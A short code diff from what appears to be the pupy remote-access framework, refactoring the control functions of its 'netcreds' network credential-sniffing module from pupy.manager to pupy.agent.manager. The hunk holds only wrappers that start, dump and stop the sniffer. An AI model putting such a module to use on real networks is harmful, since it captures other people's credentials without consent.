@@ -58,11 +58,11 @@ T = '\033[93m'  # tan
 ############## Stat / Stop / Dump functions ##############
 
 def netcreds_start(interface=None, filterip=None, listWinInterfaces=False):
-    if pupy.manager.active(Netcreds):
+    if pupy.agent.manager.active(Netcreds):
         return False
 
     try:
-        pupy.manager.create(
+        pupy.agent.manager.create(
             Netcreds, interface=interface, filterip=filterip
         )
     except:
@@ -71,14 +71,14 @@ def netcreds_start(interface=None, filterip=None, listWinInterfaces=False):
     return True
 
 def netcreds_dump():
-    nc = pupy.manager.get(Netcreds)
+    nc = pupy.agent.manager.get(Netcreds)
     if nc:
         return nc.results
 
 def netcreds_stop():
-    nc = pupy.manager.get(Netcreds)
+    nc = pupy.agent.manager.get(Netcreds)
     if nc:
-        pupy.manager.stop(Netcreds)
+        pupy.agent.manager.stop(Netcreds)
         return nc.results
 
 ############## Main class ##############
